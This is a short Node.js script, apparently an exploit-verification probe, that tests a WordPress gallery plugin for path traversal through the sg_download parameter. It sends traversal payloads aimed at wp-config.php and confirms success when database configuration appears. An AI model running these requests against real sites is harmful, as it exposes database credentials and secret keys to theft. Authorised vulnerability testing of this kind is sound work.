// Exploit-verification probe: Simple Gallery <= 2.0.0 path traversal via ?sg_download=
// Usage: node probe.mjs <base-url>
// Exit 0 = vulnerable (arbitrary file read confirmed), 1 = not vulnerable / not confirmed.
// Read-only: makes GET requests to the given base URL only. No state is changed on the target.

const rawBase = process.argv[2];
if (!rawBase) {
  console.error('usage: node probe.mjs <base-url>');
  process.exit(1);
}

let base;
try {
  base = new URL(rawBase);
} catch {
  console.error(`invalid base url: ${rawBase}`);
  process.exit(1);
}
if (base.protocol !== 'http:' && base.protocol !== 'https:') {
  console.error('base url must be http or https');
  process.exit(1);
}

// Traversal depths from the gallery dir (wp-content/uploads/simple-gallery/) up to ABSPATH.
// Default layout needs 3 levels; a few extra are tried in case uploads are relocated.
const TRAVERSALS = [
  '../../../wp-config.php',
  '../../../../wp-config.php',
  '../../../../../wp-config.php',
];

// Distinctive content of wp-config.php; a fixed site will not serve it.
const MARKER = /define\(\s*['"]DB_NAME['"]/;

async function tryRead(traversal) {
  const url = new URL('/', base);
  url.search = '?sg_download=' + traversal;
  const res = await fetch(url, { redirect: 'manual' });
  const body = await res.text();
  return { status: res.status, body };
}

let vulnerable = false;
let lastError = null;

for (const t of TRAVERSALS) {
  try {
    const { status, body } = await tryRead(t);
    if (status === 200 && MARKER.test(body)) {
      console.log(`VULNERABLE: sg_download traversal "${t}" returned wp-config.php contents (HTTP ${status}).`);
      vulnerable = true;
      break;
    }
    console.log(`no read via "${t}" (HTTP ${status})`);
  } catch (err) {
    lastError = err;
    console.error(`request failed for "${t}": ${err && err.message ? err.message : err}`);
  }
}

if (vulnerable) {
  process.exit(0);
}

if (lastError) {
  console.error('NOT CONFIRMED: at least one request failed; target may be unreachable.');
} else {
  console.log('NOT VULNERABLE: traversal did not expose wp-config.php.');
}
process.exit(1);
